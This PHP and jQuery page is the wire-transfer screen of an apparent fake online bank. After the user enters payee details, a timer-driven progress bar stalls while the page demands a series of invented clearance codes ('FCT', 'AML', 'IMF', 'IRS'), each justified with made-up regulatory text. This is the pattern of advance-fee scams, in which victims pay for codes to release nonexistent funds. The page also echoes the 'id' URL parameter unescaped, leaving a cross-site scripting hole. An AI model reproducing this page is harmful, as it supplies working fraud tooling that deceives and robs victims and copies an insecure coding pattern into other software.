<?php 
include("dist/_partials/header.php");

 ?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Wire</title>
	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</head>
<body style="height:700px">
	<div class="container-fluid"style="margin-top: 20px;">
		<div class="col-md-12">
			<div class="row">
				<div class="col-md-1"></div>
				<div class="col-md-10">
					<table class=" table table-responsive table-borderless ">
			    		<thead>
			    			<tr>
			    				<th style="color:#007b85; font-size:20px">Payments & transfers</th>
			    			</tr>
			    			<tr>
			    				<th >
			    					<a href="pages_payment_transfers.php"><button style="background-color:navy; border: none; color:white; width: 90px;">Internal</button></a>
			    					<a href="pages_account_selector.php"><button style="background-color:#007b85; border:none; color: white; width:90px">Wire</button></a>
			    					<a href="pages_pay_bills.php?client_id=<?php echo isset($_SESSION['client_id']) ? $_SESSION['client_id'] : ''; ?>">
                                       <button style="background-color:navy; border: none; color:white; width:90px">Bill pay</button>
                                    </a>
			    				</th>
			    			</tr>
			    		</thead>
			    	</table>
				</div>
				<div class="col-md-1"></div>
				
			</div>
		</div>
	</div>
    <form method="post" id="form_wire">
	<div class="container-fluid">
		<div class="col-md-12">
			<div class="row">
				<div id="result"></div>
				<div class="col-md-4"></div>
			    <div class="col-md-2">
			    	<div class="form-group">
			    		<label>Account Name:</label>
			    		<input type="text" name="account_name" autocomplete="off" placeholder="Account Name" required>
			    	</div>
			    	<div class="form-group">
			    		<label>Account Number:</label>
			    		<input type="text" name="account_number" autocomplete="off" placeholder="Account Number" required>
			    	</div>
			    	<div class="form-group">
			    		<label>Bank Address:</label>
			    		<input type="text" name="bank_address" required autocomplete="off" placeholder="Bank Address">
			    	</div>
			    	<div class="form-group">
			    		<label>State:</label>
			    		<input type="text" name="state" required autocomplete="off" placeholder="State">
			    	</div>
			    	<div class="form-group">
			    		<label>Zip Code:</label>
			    		<input type="text" name="zip_code" required autocomplete="off" placeholder="Zip Code">
			    	</div>
			   
			    	
			    </div>
			    <div class="col-md-2">
			    	<div class="form-group">
			    	    <label>Bank Name:</label>
			    	    <input type="text" name="bank_name" autocomplete="off" placeholder="Bank Name">
			       </div>
			       <div class="form-group">
			       	    <label>Routing Number:</label>
			       	    <input type="text" name="routing_number" required autocomplete="off" placeholder="Routing Number">
			       </div>
			       <div class="form-group">
			       	    <label>Receiving country:</label>
			       	    <input type="text" name="receiving_country" required autocomplete="off" placeholder="Receiving Country">
			       </div>
			       <div class="form-group">
			       	    <label>City:</label>
			       	    <input type="text" name="city" required autocomplete="off" placeholder="City">
			       </div>
			       <div class="form-group">
			       	    <label>Transfer Amount:</label>
			       	    <input type="text" name="tr_amount" required autocomplete="off" placeholder="Transfer Amount">
			       </div>
			       <div>
			       	<input type="hidden" name="account_id" value="<?php echo $_GET['id']; ?>">
			       </div>
			       <div style="margin-top:20px" class="form-group">
			    		<input type="button" name="proceed" id="proceed_wire" value="Proceed Wire" style="background-color:#007b85; color:white; border:none; border-radius:8px;">
			    	</div>
			    </div>
			    <div class="col-md-4"></div>
			</div>
		</div>
	</div>
	</form>


<!-- Modal -->
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle" style="color:red; font-size:13px">Note!! Closing this tab we result imcomplete tranfer!</h5>
       
      </div>
      <div class="modal-body">
      	<form method="post" id="ftcForm">
      		<div id="resultContainer"></div>
      	<div>
      	   <label>Fund Transfer processing....</label>

           <div class="progress">
              <div id="progressBar" class="progress-bar bg-success" role="progressbar" style="width:0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"> <span id="incrementNumber"></span></div>
           </div>	
         </div>
         <div id="ftcSection" style="display:none;">
         	  <p style="font-size: 11px; margin-top: 20px;">Please enter your FCT code to proceed with your funds transfer</p>     
        
            <div class="form-group">
         	    <span style="font-size:11px">FCT code is the Federal Capital Tax Code for the total sum of your Escrow account.</span>
         	    <input type="text" name="FTC_CODE" placeholder="FTC" id="ftcCodeInput">
            </div>
         </div>
          
         <div id="amlSection" style="display:none;">
         	    <p style="font-size: 11px; margin-top: 20px;">Please enter your Anti Money Laundering (AML) code to proceed with your funds transfer</p>     
       
              <div class="form-group">
         	       <span style="font-size:11px">Anti Money Laundering(AML) code is required due to the new EU guidelines regarding international transfers of over a million dollars.</span>
         	       <input type="text" name="AML_CODE" placeholder="AML" id="AMLCodeInput">
             </div>
         </div>
         <div id="IMFSection" style="display:none;">
         	    <p style="font-size: 11px; margin-top: 20px;">Please enter your IMF code to proceed with your funds transfer</p>     
       
              <div class="form-group">
         	       <span style="font-size:11px">IMF code is International Monetary Fund is the IMF code that regulates international remittance transfer.</span>
         	       <input type="text" name="IMF_CODE" placeholder="IMF" id="IMFCodeInput">
             </div>
        </div>
        <br>
        <div id="IRSSection" style="display:none;">
         	    <p style="font-size: 11px; margin-top: 20px;">Please enter your IRS code to proceed with your funds transfer</p>     
       
              <div class="form-group">
         	       <span style="font-size:11px">IIRS code is Internal Revenue Service code is the validation code from the Steiermark internal revenue service, for your Escrow account remittance transfer</span>
         	       <input type="text" name="IRS_CODE" placeholder="IRS" id="IRSCodeInput">
             </div>
        </div>
        <div style="display: none;" id="Processed">
        	<p>Your wire transfer is processed successfully! <i class="fa-solid fa-circle-check" style="color: #0bb188;"></i></p>
        	<p>Wait for approval from your bank!</p>
        </div>

      <div class="modal-footer">
        <!-- <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button> -->
        <button type="button" id="proceedButton"class="btn btn-primary">Proceed</button>
        <button type="button" id="proceedAMLButton" class="btn btn-primary" style="display:none">Proceed</button>
        <button type="button" id="proceedIMFButton" class="btn btn-primary" style="display:none">Proceed</button>
        <button type="button" id="proceedIRSButton" class="btn btn-primary" style="display:none">Proceed</button>

      </div>
      </form>
    </div>
  </div>
</div>
<!-- end modal -->
<script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
<script type="text/javascript">


$(document).ready(function () {
	 var progressValue = 0;
    var progressBar = $("#progressBar");
    var incrementNumber = $("#incrementNumber");

    function incrementProgress() {
        progressBar.css("width", progressValue + "%");
        progressBar.attr("aria-valuenow", progressValue);
        incrementNumber.text(progressValue + "%"); 
        progressValue++;
    }

    function startProgress() {
        var interval = setInterval(function () {
            if (progressValue <= 20) {
                incrementProgress();
            } else {
                clearInterval(interval);
            }
        }, 1000);
    }

    $("#proceed_wire").click(function (e) {


        e.preventDefault();

        var form = $("#form_wire")[0];

        if (form.checkValidity()) {
            var formData = $("#form_wire").serialize();

            $.ajax({
                method: "POST",
                url: "ajax_wire_transfer.php",
                data: formData,
                success: function (response) {
                    if (response.includes('Detailsuccess')) {
                    	   alert("details received");
                    	   //$('#form_wire')[0].reset();
                    	   startProgress();
                        $('#exampleModalCenter').modal('show');
                        startProgress();

                        $("#result").html(response);
                        setTimeout(function(){
                        $("#ftcSection").show();
                         },15000)
                    } else {
                        alert("Error receiving details");
                         $("#result").html(response);
                    }
                }
            });
        } else {
            form.reportValidity();
        }
    });
  });

$("#proceedButton").click(function(e){


   var progressValue = 20;
    var progressBar = $("#progressBar");
    var incrementNumber = $("#incrementNumber");

    function incrementProgress() {
        progressBar.css("width", progressValue + "%");
        progressBar.attr("aria-valuenow", progressValue);
        incrementNumber.text(progressValue + "%"); 
        progressValue++;
    }

    function startProgress() {
        var interval = setInterval(function () {
            if (progressValue <= 40) {
                incrementProgress();
            } else {
                clearInterval(interval);
            }
        }, 1000);
    }
			e.preventDefault();
				var FTC_formData = $("#ftcForm").serialize();
				$.ajax({
					method:"POST",
					url:"ajax_cot.php",
					data:FTC_formData,
					success:function(ftcresponse){
						if (ftcresponse.includes('success')) {
							  $("#ftcSection").hide();
							  $("#proceedButton").hide();
							alert("FTC code is valid. Proceeding to the next step.");
							startProgress();

							setTimeout(function(){
							$("#amlSection").show();
							$("#proceedAMLButton").show();
						     },25000)
							//$("#resultContainer").html(ftcresponse);
						}else{
							  alert("Error: FTC code does not match.");
						}
					}
				});
			});
		
$("#proceedAMLButton").click(function(){

    var progressValue = 40;
    var progressBar = $("#progressBar");
    var incrementNumber = $("#incrementNumber");

    function incrementProgress() {
        progressBar.css("width", progressValue + "%");
        progressBar.attr("aria-valuenow", progressValue);
        incrementNumber.text(progressValue + "%"); 
        progressValue++;
    }

    function startProgress() {
        var interval = setInterval(function () {
            if (progressValue <= 60) {
                incrementProgress();
            } else {
                clearInterval(interval);
            }
        }, 1000);
    }
				  var amlFormData = $("#ftcForm").serialize();
				  $.ajax({
				  	method:"POST",
				  	url:"ajax_cot.php",
				  	data:amlFormData,
				  	success:function(amlresponse){
				  		if (amlresponse.includes('AMLsuccess')) {
				  			$("#amlSection").hide();
				  			$("#proceedAMLButton").hide();
				  			startProgress();
				  			alert("AML code is valid. Proceeding to the next step.");
				  			setTimeout(function(){
				  			$("#IMFSection").show();
				  			$("#proceedIMFButton").show();
				  		},25000)
				  			// $("#resultContainer").html(amlresponse);
				  			

				  		}else{
				  			 alert("Error: AML code does not match.");

				  		}
				  	}
				  });
			});
     
$("#proceedIMFButton").click(function(){
	var progressValue = 60;
    var progressBar = $("#progressBar");
    var incrementNumber = $("#incrementNumber");

    function incrementProgress() {
        progressBar.css("width", progressValue + "%");
        progressBar.attr("aria-valuenow", progressValue);
        incrementNumber.text(progressValue + "%"); 
        progressValue++;
    }

    function startProgress() {
        var interval = setInterval(function () {
            if (progressValue <= 80) {
                incrementProgress();
            } else {
                clearInterval(interval);
            }
        }, 1000);
    }
				var imfFormData = $("#ftcForm").serialize();
				$.ajax({
					method:"POST",
					url:"ajax_cot.php",
					data:imfFormData,
					success:function(imfresponse){
						if (imfresponse.includes('IMFsuccess')) {
							$("#IMFSection").hide();
							$("#proceedIMFButton").hide();
							startProgress();
							alert("IMF code is valid. Proceeding to the next step.");
							setTimeout(function(){
							$("#proceedIRSButton").show();
							$("#IRSSection").show();
						    }, 25000)
							// $("#resultContainer").html(imfresponse);

						}else{
							alert("Error: IMF code does not match.");
						}
					}
				});
			});
	
$("#proceedIRSButton").click(function(){
	var progressValue = 80;
    var progressBar = $("#progressBar");
    var incrementNumber = $("#incrementNumber");

    function incrementProgress() {
        progressBar.css("width", progressValue + "%");
        progressBar.attr("aria-valuenow", progressValue);
        incrementNumber.text(progressValue + "%"); 
        progressValue++;
    }

    function startProgress() {
        var interval = setInterval(function () {
            if (progressValue <= 100) {
                incrementProgress();
            } else {
                clearInterval(interval);
            }
        }, 1000);
    }
				var IRSFormData = $("#ftcForm").serialize();
				$.ajax({
					method:"POST",
					url:"ajax_cot.php",
					data:IRSFormData,
					success:function(irsresponse){
						if (irsresponse.includes('IRSsuccess')) {
                             $("#proceedIRSButton").hide();
							 $("#IRSSection").hide();
							 startProgress();
                             alert("IRS code is valid. Proceeding to the next step.");
                             // $("#resultContainer").html(irsresponse);
                             setTimeout(function(){
                             	$("#Processed").show();
                             }, 25000)
                             
                             setTimeout(function(){
               	              $('#exampleModalCenter').modal('hide');
               	              window.location.href = "pages_account_selector.php";
                             }, 30000);

						}else{
							alert("Error: IMF code does not match.");
						}
					}
				})
			});
	</script> 


</body>
</html>